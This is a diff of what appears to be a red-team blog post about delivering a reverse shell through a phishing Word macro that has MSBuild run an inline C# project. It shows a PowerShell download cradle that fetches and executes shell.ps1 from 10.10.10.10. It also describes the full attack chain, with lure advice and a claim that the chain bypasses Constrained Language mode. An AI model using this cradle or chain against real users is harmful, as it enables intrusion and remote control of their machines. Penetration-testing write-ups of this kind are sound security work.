@@ -23,15 +23,15 @@ We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-Within this we execute our second stage PowerShell 3.0+ download cradle:
+Within this the second stage is executed (PowerShell 3.0+ download cradle):
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
-our shell.ps1:
+Shell.ps1:
 
 <script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>
 
-Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will do just this.
+Good. Now we need a means of delivering the project file and executing MSBuild. The macro below will do just this.
 
 <script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>
 
@@ -39,14 +39,20 @@ In order to stand a chance of the macro being executed, we need to dress the doc
 
 John Lambert (@JohnLaTwC) regularly shares interesting phishing lures and payloads, if you need inspiration for simulated phishing campaigns ;) . I find the "Document created in newer/older Office version" lures especially convincing. John has put together [this](https://t.co/OwH28ltngy) compendium of macro based lures, which is great for educating users about the different techniques attackers use.
 
-Now that our "malicious" document has been created we can test this out.
+FailedDeliveryNotification.docx:
 
-IMAGE OF DOCUMENT HERE
 
-Once the user opens the document...
+
+Now that our "malicious" document has been created we can test it out.
+
+Once the user opens the document and enables macros, the powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner.
 
 ![rules]({{ site.url }}/images/shell.png){: .center-image }
 
+This payload is also an effective means of bypassing PowerShell Contrained Language mode.
+
+Improvements
+Mitigations
 
 
 
